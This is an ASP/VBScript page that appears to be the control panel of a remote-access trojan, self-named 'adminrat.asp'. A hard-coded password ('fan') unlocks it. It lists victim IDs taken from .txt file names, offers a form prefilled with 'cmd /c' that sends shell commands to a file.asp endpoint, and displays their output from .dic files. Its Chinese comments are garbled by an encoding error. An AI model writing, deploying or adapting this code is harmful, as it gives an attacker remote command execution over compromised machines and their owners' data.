<%
on error resume next

	if request("pass")="fan" then  '�����޸�����
		session("pw")="go"
	end if

	if session("pw")<>"go" then 
		Response.write "<br><form action='' method='post'><br><br><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"
		Response.write "<input style=width:300px;height:80px; name='pass' type='password' size='10'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input style=width:70px;height:80px; type='submit' value='submit'></form>"
	else if request("os") <> "" then
		Response.Write "<form action='/file.asp?id=" + request("os") + "' method='post' ��nsubmit='return false' name='iframeForm'  target='iframeForm'>cmd: <input style=width:300px;height:50px; type='text' name='str' value='cmd /c ' /><button style=width:100px;height:50px; type='submit' class='btn btn-primary'>submit</button>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type='button' style=width:100px;height:50px; name='show' value='resh' onClick='window.location.reload();'></br></br> <!--ˢ�°�ť--></form><iframe id='iframeForm' name='iframeForm' style='display:none;'></iframe> "
		set fs=server.createobject("scripting.filesystemobject")
		file=server.mappath(Request("os")&".dic")
		set txt=fs.opentextfile(file,1,true) '1ֻ��,2д,8 ���ļ������ļ�ĩβ��ʼд,True �� Unicode ��ʽ���ļ�,False �� ASCII ��ʽ��,UseDefault ʹ��ϵͳĬ��ֵ���ļ�
		if not txt.atendofstream then '��ȷ����û�е����β��λ��
		Content = txt.ReadAll '��ȡ�����ļ�������
		'Line = Replace(Content, vbCrlf, "<br>") '���ı��ڷ����ַ�vbCrlf����HTML���б��"<br>"
		Response.Write "<textarea name='text' cols=100 rows=30 width=30>" + Content + "</textarea >"
		end if
		
	else
		Set fs = CreateObject("Scripting.FileSystemObject")
		Set f = fs.GetFolder(Server.MapPath(".\")) '�ļ��е�����
		Set fc = f.Files
		For Each f1 In fc
        If getExt(f1.name) = "txt" Then
            response.write "<a style='font-size:70px;' href='adminrat.asp?os=" + Replace(f1.name, ".txt", "") + "' target='_blank'>" + Replace(f1.name, ".txt", "") + "</a><br>"
        End If
		Next
		Set objFolder = Nothing '�ͷŶ��� 
		Set fso = Nothing
	end if
	end if

'��ȡ�ļ�����
Function getExt(str)
	getExt = LCase(Right(str,Len(str) - InStrRev(str,".")))
End Function
%>